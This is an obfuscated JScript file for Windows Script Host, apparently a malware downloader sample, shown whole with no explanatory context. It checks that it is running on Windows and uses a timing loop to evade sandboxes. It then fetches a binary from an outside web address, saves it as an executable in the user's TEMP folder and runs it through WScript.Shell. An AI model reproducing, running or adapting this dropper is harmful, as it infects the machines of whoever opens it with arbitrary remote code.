var _R1 = false;
var _W = "CreateObject";
var _E0 = function _A() {return WScript[_W]("WScript"+".Shell");}(), _F2 = 11;
var _E = "MSXML2.XMLHTTP";
var _R0 = 2123213;
var _GI = 0;
function _WS(_JS){_E0["Run"](_JS, _GI, _GI);};
function _BA(){return _E + "";};
function _PO(_CD, _ET){_GI = _GI * 1; return _CD - _ET;};
function _H(){return _W;};
/*@cc_on
  @if (@_win32 || @_win64)
    _R1 = true;
  @end
@*/
if (_R1)
{
var _OX = "";
function _R(){return 22;};
var _H0 = 0; var _A0 = 0;
function _UR()
{
var _JF = new this["Date"]();
var _T = _JF["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _JF = new this["Date"]();
var _BZ = _JF["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _JF = new this["Date"]();
var _I = _JF["getUTCMilliseconds"]();
var _H0 = "_F0";
_H0 = _PO(_BZ, _T);
var _A0 = "_Z";
_A0 = _PO(_I, _BZ);
_OX = "open";
return _PO(_H0, _A0);
}
var _B = false;
var _OU = false;
for (var _RX = _GI; _RX < _R() * 1; _RX++){if (_UR() != _GI){
_B = true; 
_A0 = "31" + 11 * _H0 + _A0; 
_OU = true; 
break;
}}
function _D() {return ((_B == true) && (_B == _OU)) ? 1 : _GI;};
if (_B && _D() && _OU){
function _P() {return _E0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "S3lfc4nHyll.ex" + "e";};
 _K = _BA();
 _KQ0 = WScript[_W](_K);
 var _KQ = 1;
 while (_KQ){
try {
	if (_KQ == 1)
	{
		_KQ0[_OX]("GET", "http://itead-europe.com/k3ias", false);
		_KQ0["send"]();
		_F1 = "Sleep";
	}
	WScript[_F1](_R() + 120); 
	if (_KQ0["readystate"] < 2 * 2) continue;
	_KQ = _GI;
	function _V(_F) {var _LG = (1, 2, 3, 4, 5, _F); return _LG;};
	_D0 = WScript[_H()]("ADODB.Stream");
	_K = _D0;
	_K[_OX]();
	_K["type"] = _V(1);
	_K["write"](_KQ0["ResponseBody"]);
	_D0["position"] = _V(_GI);
	_K["Save" + "ToFile"](_P(), 2);
	_D0["cl"+"ose"]();
	_KC = _P();
	_WS(_KC);
} catch(_ZP){};
}
}
}

